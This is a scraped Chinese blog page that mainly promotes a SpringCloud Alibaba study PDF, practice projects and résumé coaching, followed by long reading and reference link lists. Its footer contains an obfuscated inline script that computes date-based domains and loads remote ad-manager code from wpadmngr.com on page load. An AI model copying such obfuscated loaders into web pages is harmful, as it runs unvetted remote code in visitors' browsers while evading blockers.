<p><em>尼恩提示：很多小伙伴来找尼恩改简历，但是发现一点漂亮的技术亮点都没有，如果确实找不到亮点，可以把这个实操做一下，写入简历，作为亮点。如果确实不清楚怎么写入简历，可以来找尼恩进行简历指导。保证 脱胎换骨、金光闪闪、天衣无缝。</em></p> 
<p><img src="https://images2.imgbox.com/3c/1d/siff6jst_o.png" alt=""></p> 
<h3><a id="hystrix__4230"></a>hystrix 服务保护</h3> 
<h3><a id="_4234"></a>…省略数万字</h3> 
<p>篇幅限制，完整版请领取《SpringCloud Alibaba 微服务 学习圣经》PDF</p> 
<h3><a id="SpringCloud__4238"></a>高质量实操：SpringCloud 高并发实战案例</h3> 
<h4><a id="110Wqps_4242"></a>1、超高并发10Wqps秒杀实操</h4> 
<p>为何要以秒杀做为高并发实战案例？</p> 
<p>秒杀案例在生活中几乎随处可见：比如商品抢购，比如春运抢票，还是就是随处可见的红包也是类似的。</p> 
<p>另外，在跳槽很频繁的IT行业，大家都会有面试的准备要求。在面试中, 秒杀业务或者秒杀中所用到的分布式锁、分布式ID、数据一致性、高并发限流等问题，一般都是成为重点题目和热门题目，为面试官和应聘者津津乐道.</p> 
<p>尼恩说明：</p> 
<p>高并发秒杀 的案例，请参见 本书的高阶版本， <a href="https://blog.csdn.net/crazymakercircle/article/details/115677785">《Java 高并发核心编程 卷3 加强版》</a></p> 
<h4><a id="2100Wqps_4260"></a>2、超高并发100Wqps车联网实操</h4> 
<p>很多小伙伴，在生产项目上主要是crud，涉及不到核心技术和组件，所以导致大家在涨薪的时候，缺失硬核的项目、核心经验做支撑，最终就业失败、涨薪受挫，直接影响后续的发展。</p> 
<p>很多的培训机构，在介绍核心组件实操的时候，没有找到真实的业务场景，不是生产级的项目，导致练习不到核心技术。</p> 
<p>《超高并发100Wqps车联网实操》是真刀真枪的核心组件实操：</p> 
<p>（1）200W+qps 行驶数据网关服务 设计、开发、实操、测试</p> 
<p>（2） 5W+qps 安全认证服务设计、开发、实操、测试</p> 
<p>（3） 10W+qps 消息服务 设计、开发、实操、测试</p> 
<p>（4） 2W+qps 用户中心 设计、开发、实操、测试</p> 
<p>（5） 2W+qps 异常监控服务 设计、开发、实操、测试</p> 
<p>（6） 5W+qps 车辆服务 设计、开发、实操、测试</p> 
<p>（7） 亿级数据 分库分表 设计、开发、实操、测试</p> 
<p>（8） devops 流水线部署、验证， K8S 自动化部署、验证</p> 
<p>在学习、实操《100W级qps车联网项目实操》之后，能具备3年以上核心Java的开发、设计经验。</p> 
<h4><a id="3N_4290"></a>3、N多其他的超高并发实操项目</h4> 
<p>尼恩和《技术自由圈》其他的P7、P8同学，会一起给大家奉献更多的超高质量实操项目</p> 
<p>并且帮助大家写入简历，保证 简历 脱胎换骨，金光闪闪。</p> 
<h3><a id="_4300"></a>…省略</h3> 
<p>尼恩说明：本文400页，10W多字，还剩下5W多字，放不下…</p> 
<p>由于公众号最多可以发布5W字</p> 
<p>还有5W多字放不下…</p> 
<p>更多内容，</p> 
<p>请参见<strong>完整版</strong>《SpringCloud Alibaba 微服务 学习圣经 》PDF</p> 
<p>请在下面《<code>技术自由圈</code>》公众号发送<code>领电子书</code></p> 
<img src="https://images2.imgbox.com/b4/14/xokiDeG2_o.png" width="600"> 
<h3><a id="_4318"></a>技术自由的实现路径：</h3> 
<h5><a id="__4320"></a>实现你的 <strong>架构自由</strong>：</h5> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/129204455">吃透8图1模板，人人可以做架构</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/129410795">10Wqps评论中台，如何架构？B站是这么做的！！！</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/128848309">阿里二面：千万级、亿级数据，如何性能优化？ 教科书级 答案来了</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/128725701">峰值21WQps、亿级DAU，小游戏《羊了个羊》是怎么架构的？</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/129145200">100亿级订单怎么调度，来一个大厂的极品方案</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/128697096">2个大厂 100亿级 超大流量 红包 架构方案</a>》</p> 
<p><em>… 更多架构文章，正在添加中</em></p> 
<h5><a id="__4338"></a>实现你的<strong>响应式 自由</strong>：</h5> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/129022714">响应式圣经：10W字，实现Spring响应式编程自由</a>》</p> 
<p>这是老版本 《<a href="https://blog.csdn.net/crazymakercircle/article/details/124120506">Flux、Mono、Reactor 实战（史上最全）</a>》</p> 
<h5><a id="_spring_cloud__4346"></a>实现你的 <strong>spring cloud 自由</strong>：</h5> 
<p>《 spring cloud Alibaba 学习圣经》 PDF</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/125057545">Nacos (史上最全)</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/120702536">nacos高可用（图解+秒懂+史上最全）</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/125059491">sentinel （史上最全）</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/125057567">Springcloud gateway 底层原理、核心实战 (史上最全)</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/129155538">SpringCloud+Dubbo3 = 王炸 ！</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/123420859">分库分表 Sharding-JDBC 底层原理、核心实战（史上最全）</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/125135726">一文搞定：SpringBoot、SLF4j、Log4j、Logback、Netty之间混乱关系（史上最全）</a>》</p> 
<h5><a id="_linux__4366"></a>实现你的 <strong>linux 自由</strong>：</h5> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/128932396">Linux命令大全：2W多字，一次实现Linux自由</a>》</p> 
<h5><a id="___4372"></a>实现你的 <strong>网络 自由</strong>：</h5> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/114527369">TCP协议详解 (史上最全)</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/129334254">网络三张表：ARP表, MAC表, 路由表，实现你的网络自由！！</a>》</p> 
<h5><a id="___4380"></a>实现你的 <strong>分布式锁 自由</strong>：</h5> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/116425814">Redis分布式锁（图解 - 秒懂 - 史上最全）</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/85956246">Zookeeper 分布式锁 - 图解 - 秒懂</a>》</p> 
<h5><a id="___4388"></a>实现你的 <strong>王者组件 自由</strong>：</h5> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/128264803">队列之王： Disruptor 原理、架构、源码 一文穿透</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/128123114">缓存之王：Caffeine 源码、架构、原理（史上最全，10W字 超级长文）</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/113751575">缓存之王：Caffeine 的使用（史上最全）</a>》</p> 
<p>《<a href="https://blog.csdn.net/crazymakercircle/article/details/126579528">Java Agent 探针、字节码增强 ByteBuddy（史上最全）</a>》</p> 
<h5><a id="___4400"></a>实现你的 <strong>面试题 自由</strong>：</h5> 
<p><a href="https://blog.csdn.net/crazymakercircle/article/details/124790425">4000页《尼恩Java面试宝典 》 40个专题</a></p> 
<h3><a id="_4410"></a>参考文献</h3> 
<p>1、疯狂创客圈 JAVA 高并发 总目录<br> https://www.cnblogs.com/crazymakercircle/p/9904544.html<br> ThreadLocal（史上最全）<br> https://www.cnblogs.com/crazymakercircle/p/14491965.html</p> 
<p>2、3000页《尼恩 Java 面试宝典 》的 35个面试专题 ：<br> https://www.cnblogs.com/crazymakercircle/p/13917138.html</p> 
<p>3、价值10W的架构师知识图谱<br> https://www.processon.com/view/link/60fb9421637689719d246739</p> 
<p>4、架构师哲学<br> https://www.processon.com/view/link/616f801963768961e9d9aec8</p> 
<p>5、尼恩 3高架构知识宇宙<br> https://www.processon.com/view/link/635097d2e0b34d40be778ab4</p> 
<p><a href="https://blog.csdn.net/crazymakercircle/article/details/115677785">《Java 高并发核心编程 卷3 加强版》</a></p> 
<p><a href="https://blog.csdn.net/crazymakercircle/article/details/129022714">《响应式圣经：10W字，实现Spring响应式编程自由》</a></p> 
<p><a href="https://blog.csdn.net/crazymakercircle/article/details/129004814">全链路异步，让你的 SpringCloud 性能优化10倍+</a></p> 
<p>https://blog.csdn.net/crazymakercircle/article/details/125057545</p> 
<p>https://yq.aliyun.com/articles/726499?spm=a2c4e.11155472.0.0.25bf72fc0yL85h</p> 
<p>https://nacos.io/zh-cn/docs/what-is-nacos.html</p> 
<p>https://blog.csdn.net/qq_38826019/article/details/109433231</p> 
<p>https://blog.csdn.net/wpc2018/article/details/122634049</p> 
<p>https://www.jianshu.com/p/7d80b94068b3</p> 
<p>https://blog.csdn.net/yhj_911/article/details/119540000</p> 
<p>http://bjqianye.cn/detail/6845.html</p> 
<p>https://blog.csdn.net/hao134838/article/details/110824092</p> 
<p>https://blog.csdn.net/hao134838/article/details/110824092</p> 
<p>https://blog.csdn.net/weixin_34096182/article/details/91436704</p> 
<p>https://blog.csdn.net/fly910905/article/details/121682625</p> 
<p>https://gaocher.github.io/2020/01/05/mono-create/</p> 
<p>https://cloud.spring.io/spring-cloud-gateway/reference/html</p> 
<p>https://cloud.spring.io/spring-cloud-gateway/reference/html/#configuring-predicates-and-filters-for-discoveryclient-routes</p> 
<p>https://www.cnblogs.com/satire/p/15092894.html</p> 
<p>https://gitee.com/bison-fork/loki/blob/v2.2.1/production/docker-compose.yaml</p> 
<p><a href="https://link.segmentfault.com/?enc=WzlLMUMo952md2iWJ%2Ff8Uw%3D%3D.%2BrEC3hYAmM8UkvaxaZmGiikG58fwDyAOLS89flwIRNB9QZTNK9EqNBAOuK0TgAPz" rel="nofollow">SkyWalking官网</a></p> 
<p><a href="https://link.segmentfault.com/?enc=m1GPNRniQEZ6L3qv%2FFMmyw%3D%3D.jhQtRyg4ivt9in5Pr2Tz%2FXX42OmcsEuuhuAtzOXWP8P%2BETHToe6huhFICHIT%2FGNp" rel="nofollow">http://skywalking.apache.org/zh/</a></p> 
<p><a href="https://link.segmentfault.com/?enc=1Qk4OFfzF7JlcEOnfldToQ%3D%3D.G%2FW836h44YsH2%2BwdL4s2cqE%2Bo07K2PZ4OJx5iI2CN2QkoJWc9N274H6oSynw2UHy" rel="nofollow">SkyWalking的docker github地址</a></p> 
<p><a href="https://link.segmentfault.com/?enc=cM9qQbcASeZSEebgWo4DiA%3D%3D.peH2zKiV7glelhHd%2B6Ikeb5Fu5SkO2DyLXirMhDUwO5gKs%2BHMfr1d5EERBRSJOat" rel="nofollow">https://github.com/apache/sky…</a></p> 
<p><a href="https://link.segmentfault.com/?enc=UX8IQ6AYCcM7kVnUEVObXA%3D%3D.RK5fhWy25RDeyimZdZbT1iUqc3rs0h3oYfPgDCduqhWy0RC%2Bmez3iUYrtMC2folgbvc9y2tpE1naBmYf4IUplr0PgcJDVa45%2BVyQh4D4N9c%3D" rel="nofollow">elasticsearch</a></p> 
<p><a href="https://link.segmentfault.com/?enc=SkchguUeEE5tgY%2Fjk1fQeQ%3D%3D.kpLpDp%2BnCZ6Ay3eMAqMyQ7nn9o2nA3l%2F%2BVCCzNsooBNWxwSvRotxDjs%2Fvun7G24YYdctaPiynrDrTSIm236%2BdSlPyJnRJTyNhqbX7JhTwXk%3D" rel="nofollow">https://www.elastic.co/guide/…</a></p> 
<p><a href="https://link.segmentfault.com/?enc=IRlIQLcfy2nqVv4Zm8vXGQ%3D%3D.y%2BmV4igqKPNg0JJLR30b8%2BXLfDO0bHg1BDrOaEKtoFlLb4U5zf%2FCH3b6q5B06XxnnWfgp6E9wk3YcOFWNwWSiA%3D%3D" rel="nofollow">skywalking中文文档</a></p> 
<p><a href="https://link.segmentfault.com/?enc=eKIdv4N6a7DZGHlkoN38HQ%3D%3D.%2BAAueWHrbR12fzIqsvTLqy4%2FGi9jGo7U4yjTWT5DTfVVsqnQpNsdo%2FL3hvUTmLTvgQ%2FZ%2Fjez71RS8wNGYB6fUw%3D%3D" rel="nofollow">https://skyapm.github.io/docu…</a></p> 
<p><a href="https://link.segmentfault.com/?enc=zL76G3tn6X2%2FbKEn9EpxcQ%3D%3D.lOuKbCyDB%2FJnLHzm7Pbt4ihkqTd%2BPtuvljamhVPTBXk1Fmp5Dyd5aG%2Fc949GNcmS5unglTtYzDs1%2FfZE1ZM8EoFKE1HduAgo6umZX0I3wcqCBiuIdmI66qMgaahYb12yHQ8K4WNIzTGoDaOLLeM9KVKeqdWKNQvpypfQ1XP4HEjBS4vSqE6meeN4f53CEzjU" rel="nofollow">agent config</a></p> 
<p><a href="https://link.segmentfault.com/?enc=V%2B3ZNdAwGtRSL5uyNIDF4g%3D%3D.jnq1mCkNt8tfUqykiZIyv20if6kHP4ySTQ77H7Y1y%2BtbakzaUexMeag0G84TZNDGh7vNZpJdK5ponXWp%2FBNd95RZdcVmxt0ORDOr%2FNAjRo1cb3ZeglxVO%2BVoj3ooJ153Y6eohtTx66kIAOSPkILa6Rdtk%2FcL7%2BHSYDIkbbLAsnK%2BtJveQNl%2F%2BGlJqFMl4fgA" rel="nofollow">https://github.com/apache/sky…</a></p> 
<p><a href="https://link.segmentfault.com/?enc=LsVE3b313PXESCqYl2D4kQ%3D%3D.FEHcuSN47iMNrXVH8raHneR1Q4b78BEf9FTW3OvBg2iCKkTW3FqmKdG0ZUJAw3yNPJ1CrReTA5RlHxZGGpaVfPI9RBQEfA5TjKDi%2BJN8k6uC6Th0nuN9UtzpbgQnifAHKcYQ1lQehM76b5wL6nP7OQxgsyXWBc8xwX2ECm8YtMI%3D" rel="nofollow">skywalking和其它agent一起使用的处理</a></p> 
<p>https://zhuanlan.zhihu.com/p/163809795</p> 
<p>https://www.cnblogs.com/you-men/p/14900249.html</p> 
<p>https://cloud.tencent.com/developer/article/1684909</p> 
<p>https://www.cnblogs.com/javaadu/p/11742605.html</p> 
<p>https://www.jianshu.com/p/2fa99bd1997e</p> 
<p>https://blog.csdn.net/weixin_42073629/article/details/106775584</p> 
<p>https://www.cnblogs.com/kebibuluan/p/14466285.html</p> 
<p>https://blog.csdn.net/weixin_42073629/article/details/106775584</p> 
<p>https://blog.csdn.net/Jerry_wo/article/details/107937902</p> 
<p>https://www.cnblogs.com/wzxmt/p/11031110.html</p> 
<p>https://blog.csdn.net/zhangshng/article/details/104558016</p> 
<p>https://blog.csdn.net/yurun_house/article/details/109025588</p> 
<p>https://blog.csdn.net/weixin_40228200/article/details/123930498</p> 
<p>https://blog.csdn.net/lanxing_huangyao/article/details/119795303</p> 
<p>https://www.codenong.com/pzlong372468585/</p> 
<p>https://www.cnblogs.com/gaofeng-henu/p/12594820.html</p> 
<p>https://www.jianshu.com/p/2e905ab659fb</p> 
<p>https://www.jianshu.com/p/ccffd6b9e3d1</p> 
<p>https://www.jianshu.com/p/e6ec6a8a6c38</p> 
<p>https://www.freesion.com/article/83831098412/</p> 
<p>https://blog.csdn.net/zhipengfang/article/details/122646692</p> 
<p>https://www.likecs.com/show-379874.html</p> 
<p>https://help.aliyun.com/document_detail/29342.html</p> 
<p>https://blog.csdn.net/fanliunian/article/details/112259986</p> 
<p>https://www.modb.pro/db/325486</p> 
<p>https://nacos.io/zh-cn/docs/monitor-guide.html</p> 
<p><a href="https://nacos.io/zh-cn/docs/monitor-guide.html" rel="nofollow">Nacos 监控手册</a></p> 
<p>https://github.com/vovolie/lua-nginx-prometheus</p> 
<p>https://blog.csdn.net/weixin_44268481/article/details/122355075</p> 
<p>https://blog.csdn.net/fu_huo_1993/article/details/114876026</p> 
<p>https://blog.csdn.net/u012888704/article/details/126232665</p> 
<p>https://www.my607.com/jianzhanjingyan/2020-10-31/92668.html</p> 
<p>https://www.jianshu.com/p/acbc04040519</p> 
<p>https://blog.csdn.net/qq_43437874/article/details/120348217</p> 
<p>https://blog.csdn.net/nandao158/article/details/120306729</p> 
<p>https://blog.csdn.net/b644ROfP20z37485O35M/article/details/120124219</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/50ad4b3608ee3fb9d08013e78720dbaf/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">误删path等环境变量(系统变量/用户变量)</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/169bd4dfecc20ae45901b9b7c4ab72b0/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">常用的加密方式有哪些?</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>